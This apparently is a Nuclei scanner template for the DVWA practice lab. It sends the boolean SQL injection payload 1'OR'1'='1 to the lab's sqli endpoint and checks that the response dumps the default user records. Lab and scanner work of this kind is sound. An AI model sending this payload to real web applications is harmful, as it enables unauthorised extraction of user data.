id: SQL_TuTuXinhXich

info:
  name: DVWA SQL Injection - Boolean Based OR 1=1
  author: duc-hung
  severity: high
  description: |
    DVWA SQLi endpoint vulnerable to Boolean-based SQL Injection.
    Payload 1'OR'1'='1 dumps all 5 records from users table.
  tags: dvwa,sqli,boolean,lab

http:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerabilities/sqli/?id=1%27OR%271%27%3D%271&Submit=Submit"

    headers:
      Cookie: "PHPSESSID=fc46c0e0de85ff4bb78103e637205a8b; security=low"

    matchers-condition: and
    matchers:

      # Xác nhận có kết quả trả về
      - type: word
        part: body
        words:
          - "First name"

      # Xác nhận dump được nhiều user cùng lúc
      - type: word
        part: body
        words:
          - "admin"
          - "Gordon"
          - "Pablo"
          - "Bob"
        condition: and      # Tất cả 4 user phải xuất hiện → chắc chắn dump thành công

      - type: status
        status:
          - 200
